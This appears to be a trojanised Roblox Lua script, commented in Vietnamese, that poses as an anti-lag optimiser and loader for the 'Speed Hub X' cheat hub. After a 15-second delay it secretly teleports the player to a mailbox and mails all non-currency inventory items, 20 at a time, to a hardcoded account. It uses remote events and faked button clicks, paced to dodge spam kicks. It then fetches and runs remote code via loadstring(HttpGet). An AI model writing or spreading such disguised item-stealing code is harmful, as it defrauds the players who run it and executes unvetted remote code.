-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB X: ĐẾN HÒM THƯ + MỞ UI + CHIA NHỎ 20 VẬT PHẨM ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- HÀM TỰ ĐỘNG DI CHUYỂN ĐẾN HÒM THƯ GỖ TRÊN MAP
-- =======================================================================
local function teleportToMailbox()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local mailboxPart = nil
    -- Quét toàn bộ Workspace để tìm mô hình Hòm thư vật lý của game
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("Model") or obj:IsA("BasePart") then
            local name = string.lower(obj.Name)
            if string.find(name, "mailbox") or string.find(name, "homthu") or string.find(name, "postbox") or string.find(name, "mail") then
                mailboxPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")) or obj
                if mailboxPart then break end
            end
        end
    end
    
    if mailboxPart then
        print("[SPEED HUB] Đã xác định vị trí Hòm thư. Đang di chuyển đến sát bên...")
        rootPart.CFrame = mailboxPart.CFrame * CFrame.new(0, 2, 3) -- Di chuyển nhân vật đứng trước hòm thư
        task.wait(1.5) -- Chờ Server đồng bộ khoảng cách an toàn (Tránh lỗi khoảng cách)
        return true
    else
        print("[SPEED HUB] Không tìm thấy hòm thư gỗ trên bản đồ. Thực hiện bật UI tại chỗ.")
        return false
    end
end

-- =======================================================================
-- THUẬT TOÁN BẬT UI VÀ TỰ ĐỘNG CHIA GÓI GỬI ĐỒ (TỐI ĐA 20 CÁI/LẦN)
-- =======================================================================
local function autoOpenAndSendMail()
    -- Thực hiện di chuyển trước khi mở UI
    teleportToMailbox()

    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not PlayerGui then return end
    
    -- 1. Tìm bảng giao diện Hòm thư (Mail UI) trong PlayerGui
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            local name = string.lower(gui.Name)
            if string.find(name, "mail") or string.find(name, "post") or string.find(name, "gift") then
                mailFrame = gui
                break
            end
        end
    end
    
    if not mailFrame then
        print("[SPEED HUB] Không tìm thấy bảng UI Mailbox để tương tác.")
        return
    end

    -- Ép hiển thị bảng Mail lên màn hình để bắt đầu các thao tác nhập dữ liệu
    pcall(function() mailFrame.Visible = true end)
    task.wait(0.5)

    -- 2. Tự động điền tên nick chính vào ô người nhận (TextBox)
    local textBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("User", true) or mailFrame:FindFirstChild("Name", true)
    if textBox and textBox:IsA("TextBox") then
        textBox.Text = targetUsername
        textBox:ReleaseFocus(true) -- Xác nhận nhập văn bản thành công
    end

    -- 3. Tìm nút Gửi (Send Button) trên giao diện để giả lập bấm
    local sendButton = nil
    for _, btn in pairs(mailFrame:GetDescendants()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            local bName = string.lower(btn.Name)
            if string.find(bName, "send") or string.find(bName, "gui") or string.find(bName, "post") or string.find(bName, "accept") then
                sendButton = btn
                break
            end
        end
    end

    -- 4. Tiến hành quét túi đồ và chia nhỏ số lượng để gửi
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
    if Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            -- Lọc các vật phẩm có số lượng lớn hơn 0
            if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                local lowerName = string.lower(item.Name)
                
                -- Loại trừ các loại dữ liệu hệ thống không phải nông sản (Tiền, Level, Xu...)
                if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") and not string.find(lowerName, "coin") then
                    
                    local remainingAmount = item.Value
                    
                    -- VÒNG LẶP CHIA NHỎ: Nếu đồ > 20 cái, cứ tách đúng đợt 20 cái gửi đi liên tục
                    while remainingAmount > 0 do
                        local sendAmount = math.min(remainingAmount, 20) -- Chỉ bốc tối đa 20 hoặc lấy số lượng còn lại nhỏ hơn 20
                        
                        -- Gọi sự kiện mạng (RemoteEvent) gửi thư của game
                        pcall(function()
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                            if MailEvent then
                                MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                            end
                        end)
                        
                        -- Giả lập hành động click chuột vào nút Gửi trên màn hình
                        if sendButton then
                            pcall(function()
                                for _, connection in pairs(getconnections(sendButton.MouseButton1Click or sendButton.TouchTap)) do
                                    connection:Fire()
                                end
                            end)
                        end
                        
                        -- Trừ bớt số lượng đã gửi và lặp tiếp cho đến khi hết món đồ này
                        remainingAmount = remainingAmount - sendAmount
                        print("[SPEED HUB] Đang đứng tại hòm thư để gửi: " .. sendAmount .. "x " .. item.Name .. " (Còn lại: " .. remainingAmount .. ")")
                        task.wait(1.5) -- Độ trễ 1.5 giây giữa mỗi đợt gửi để tránh bị kick do spam gói tin
                    end
                    
                end
            end
        end
    end
    print("[SPEED HUB] Hoàn tất quá trình dọn kho và gửi toàn bộ qua Mail thành công!")
end

-- =======================================================================
-- BẮT ĐẦU ĐẾM NGƯỢC THỜI GIAN CHỜ 15 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(15)
    pcall(autoOpenAndSendMail)
end)

-- =======================================================================
-- TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
